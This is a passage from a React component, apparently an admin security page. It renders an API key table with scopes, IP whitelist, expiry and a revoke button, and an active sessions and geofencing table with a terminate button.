                        {key.scopes.map(s => (
                          <span key={s} style={{ fontSize: '0.65rem', background: 'var(--bg-surface)', padding: '2px 6px', borderRadius: '4px', color: 'var(--primary-400)', border: '1px solid var(--border-subtle)' }}>
                            {s}
                          </span>
                        ))}
                      </div>
                    </td>
                    <td style={{ fontFamily: 'var(--font-mono)', fontSize: '0.72rem', color: 'var(--text-muted)' }}>
                      {key.ipWhitelist.join(', ')}
                    </td>
                    <td style={{ fontSize: '0.72rem', color: 'var(--text-muted)' }}>
                      {key.createdAt.slice(0, 10)} → {key.expiresAt.slice(0, 10)}
                    </td>
                    <td style={{ fontSize: '0.72rem', color: 'var(--text-secondary)' }}>
                      {key.lastUsedAt ? key.lastUsedAt.replace('T', ' ').slice(0, 19) : 'Never'}
                    </td>
                    <td style={{ textAlign: 'center' }}>
                      <span style={{ 
                        fontSize: '0.7rem', 
                        fontWeight: 700, 
                        padding: '2px 8px', 
                        borderRadius: 'var(--radius-full)',
                        background: key.status === 'ACTIVE' ? 'rgba(16, 185, 129, 0.15)' : 'rgba(239, 68, 68, 0.15)',
                        color: key.status === 'ACTIVE' ? '#34d399' : '#f87171'
                      }}>
                        {key.status}
                      </span>
                    </td>
                    <td style={{ textAlign: 'center' }}>
                      {key.status === 'ACTIVE' && (
                        <button
                          onClick={() => handleRevokeApiKey(key.id)}
                          style={{
                            background: 'transparent',
                            border: '1px solid rgba(239, 68, 68, 0.3)',
                            color: '#f87171',
                            padding: '4px 8px',
                            borderRadius: 'var(--radius-sm)',
                            fontSize: '0.7rem',
                            cursor: 'pointer'
                          }}
                          title="Revoke Token"
                        >
                          Revoke
                        </button>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* TAB 5: ACTIVE SESSIONS & GEOFENCING */}
      {activeSubTab === 'SESSIONS' && (
        <div className="glass-panel" style={{ padding: '22px' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '16px' }}>
            <div>
              <h3 style={{ fontSize: '1.1rem', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '8px' }}>
                <Globe size={18} style={{ color: 'var(--accent-purple)' }} />
                Active Authenticated Sessions & Geofence Security
              </h3>
              <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)' }}>
                Inspect logged-in officer terminals, enforce VPN geofencing, and revoke compromised remote sessions.
              </p>
            </div>
          </div>

          <div className="custom-table-wrap">
            <table className="custom-table">
              <thead>
                <tr>
                  <th>Device / Workstation</th>
                  <th>Client Browser / OS</th>
                  <th>Physical Geofence Location</th>
                  <th>Network IP / Leased Line</th>
                  <th>Login Time</th>
                  <th>Last Active</th>
                  <th style={{ textAlign: 'center' }}>Action</th>
                </tr>
              </thead>
              <tbody>
                {activeSessions.map((sess) => (
                  <tr key={sess.sessionId}>
                    <td>
                      <div style={{ fontWeight: 700, fontSize: '0.82rem', display: 'flex', alignItems: 'center', gap: '6px' }}>
                        {sess.device}
                        {sess.isCurrentSession && (
                          <span style={{ fontSize: '0.65rem', background: 'rgba(16, 185, 129, 0.2)', color: '#34d399', padding: '1px 6px', borderRadius: 'var(--radius-full)', fontWeight: 700 }}>
                            THIS DEVICE
                          </span>
                        )}
                      </div>
                    </td>
                    <td style={{ fontSize: '0.75rem', color: 'var(--text-secondary)' }}>{sess.browser}</td>
                    <td style={{ fontSize: '0.78rem' }}>{sess.location}</td>
                    <td style={{ fontFamily: 'var(--font-mono)', fontSize: '0.72rem', color: 'var(--accent-gold)' }}>{sess.ipAddress}</td>
                    <td style={{ fontSize: '0.72rem', color: 'var(--text-muted)' }}>{sess.loginTime.replace('T', ' ').slice(0, 19)}</td>
                    <td style={{ fontSize: '0.75rem', color: '#10b981', fontWeight: 600 }}>{sess.lastActive}</td>
                    <td style={{ textAlign: 'center' }}>
                      {!sess.isCurrentSession && (
                        <button
                          onClick={() => handleTerminateSession(sess.sessionId)}
                          className="btn-secondary"
                          style={{ fontSize: '0.7rem', padding: '3px 8px', color: '#ef4444', borderColor: 'rgba(239, 68, 68, 0.3)' }}
                        >
                          Terminate
                        </button>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}
    </div>
  );
};
